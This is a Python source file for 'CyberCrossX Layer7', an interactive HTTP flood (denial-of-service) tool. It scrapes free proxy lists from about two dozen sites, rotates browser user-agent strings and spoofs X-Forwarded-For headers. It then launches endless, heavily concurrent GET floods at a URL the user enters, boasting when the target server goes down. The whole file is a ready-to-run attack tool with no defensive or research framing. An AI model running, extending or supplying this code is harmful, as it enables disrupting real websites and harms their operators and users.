import random
import aiohttp
import asyncio
import requests
import sys
import os
import re

CyberCrossX = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"
cyan = "\033[96m"

user_agent = [
    # --- Chrome ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Mobile Safari/537.36",

    # --- Mozilla Firefox ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.2; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Android 12; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",

    # --- Opera ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Linux; Android 12; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Mobile Safari/537.36 OPR/75.2.3978.72468",

    # --- Safari ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",

    # --- UC Browser ---
    "Mozilla/5.0 (Linux; U; Android 10; en-US; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 UCBrowser/13.4.0.1306 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 UCBrowser/12.13.2.1000 Mobile Safari/537.36",

    # --- DuckDuckGo ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36 DuckDuckGo/2024.5",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 DuckDuckGo/7",

    # --- Bonus: Edge Chromium ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36 Edg/123.0.2420.97",
]


proxysite = [
    # --- Proxy Lists Umum ---
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
    "https://free-proxy-list.net/",
    "https://www.sslproxies.org/",
    "https://www.proxynova.com/proxy-server-list/",
    "https://www.proxy-list.download/",
    "https://proxy-daily.com/",
    "https://proxylist.geonode.com/free-proxy-list",
    "https://proxydb.net/",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.hide-my-ip.com/proxylist.shtml",
    "https://www.my-proxy.com/free-proxy-list.html",
    "https://www.spys.one/en/free-proxy-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://openproxy.space/list",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",

    # --- Khusus SOCKS5 & Anonim ---
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5",
    "https://www.socks-proxy.net/",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",

    # --- API/Open Scraper-Friendly ---
    "https://proxyscrape.com/api?request=displayproxies&proxytype=http&timeout=10000&ssl=all&anonymity=all",
    "https://api.openproxylist.xyz/http.txt",
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000"
]

def proxylist(url):
    proxies = []
    try:
        response = requests.get(url, timeout=5)
        proxy_list = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)
        proxies.extend(proxy_list)
    except Exception as e:
        print(f"[CyberCrossX] {e}")
    return proxies

all_proxies = []
for site in proxysite:
    proxies = proxylist(site)
    all_proxies.extend(proxies)

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{CyberCrossX}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗       ██╔╝ 
███████╗██║  ██║   ██║   ███████╗██║  ██║       ██║  
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝ {clear}
               
╔═════════════════════════════════════════════════════╗
║ {CyberCrossX}*{clear} version   {CyberCrossX}:{clear}   4.0                                 ║
║ {CyberCrossX}*{clear} CyberCrossX      {CyberCrossX}:{clear}  {CyberCrossX}[{clear}{white}LAYER7{clear}{CyberCrossX}]{clear}                             ║  
╚═════════════════════════════════════════════════════╝
               
╔═════════════════════════════════════════════════════╗
║ {CyberCrossX}[{clear}1{CyberCrossX}]{clear} HTTP Flood Attack                               ║
║ {CyberCrossX}[{clear}2{CyberCrossX}]{clear} HTTP Flood Attack {CyberCrossX}[{clear}{white}PROXY{clear}{CyberCrossX}]{clear}                       ║                       
║ {CyberCrossX}[{clear}3{CyberCrossX}]{clear} Exit CyberCrossX                                       ║                                 
╚═════════════════════════════════════════════════════╝           
""")

def layer7():
    while True:
        logo()
        select = input(f"""
╔═══[{CyberCrossX}root{clear}@{CyberCrossX}CyberCrossX{clear}]
╚══{CyberCrossX}>{clear} """)
                                        
        if select == "1" or select.lower() == "1":
            async def send_request(session, url, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                }
                try:
                    async with session.get(url, headers=headers) as response:
                        print(f"[{CyberCrossX}CyberCrossX{clear}] Url {CyberCrossX}:{clear} {url} {CyberCrossX}|{clear} Status {CyberCrossX}:{clear} {red}{response.status}{clear}")
                except aiohttp.ClientConnectorError:
                    print(f"[{red}-{clear}] {red}Server has down by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(f"[{red}-{clear}] {red}Server has disconnected by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except asyncio.TimeoutError:
                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)

            async def send_requests(url, threads):
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    while True: 
                        tasks = [send_request(session, url) for _ in range(threads)] 
                        await asyncio.gather(*tasks)  

            async def start_threads(url, threads):
                tasks = []
                for _ in range(threads):
                    task = asyncio.create_task(send_requests(url, threads))
                    tasks.append(task)

                await asyncio.gather(*tasks)

            url = input(f"[{CyberCrossX}CyberCrossX{clear}] URL     {CyberCrossX}>{clear} ")
            threads = int(input(f"[{CyberCrossX}CyberCrossX{clear}] THREAD     {CyberCrossX}>{clear} "))
            print(f"[{CyberCrossX}CyberCrossX{clear}] {url}")
            asyncio.run(start_threads(url, threads))


        elif select == "2" or select.lower() == "2":
            async def send_request(session, url, proxy, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                    "X-Forwarded-For": proxy, 
                }
                
                try:
                    async with session.get(url, headers=headers) as response:
                        print(f"[{CyberCrossX}CyberCrossX{clear}] Url {CyberCrossX}:{clear} {CyberCrossX}{proxy}{clear} {CyberCrossX}>{clear} {url} {CyberCrossX}|{clear} Status {CyberCrossX}:{clear} {red}{response.status}{clear}")
                except aiohttp.ClientConnectorError:
                    print(f"[{red}-{clear}] {red}Server has down by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(f"[{red}-{clear}] {red}Server has disconnected by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)
                except asyncio.TimeoutError:
                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)

            async def send_requests(url, proxy_list, threads):
                async with aiohttp.ClientSession() as session:
                    while True:
                        tasks = [
                            send_request(session, url, random.choice(proxy_list)) for _ in range(threads)
                        ]
                        await asyncio.gather(*tasks)

            async def start_threads(url, proxy_list, threads):
                tasks = []
                for _ in range(threads):
                    task = asyncio.create_task(send_requests(url, proxy_list, threads))  
                    tasks.append(task)

                await asyncio.gather(*tasks)

            url = input(f"[{CyberCrossX}CyberCrossX{clear}] URL     {CyberCrossX}>{clear} ")
            threads = int(input(f"[{CyberCrossX}CyberCrossX{clear}] THREAD     {CyberCrossX}>{clear} "))
            print(f"[{CyberCrossX}CyberCrossX{clear}] {url}")
            asyncio.run(start_threads(url, all_proxies, threads)) 


        elif select == "3" or select.lower() == "3": 
            sys.exit()


if __name__ == "__main__":
    layer7()





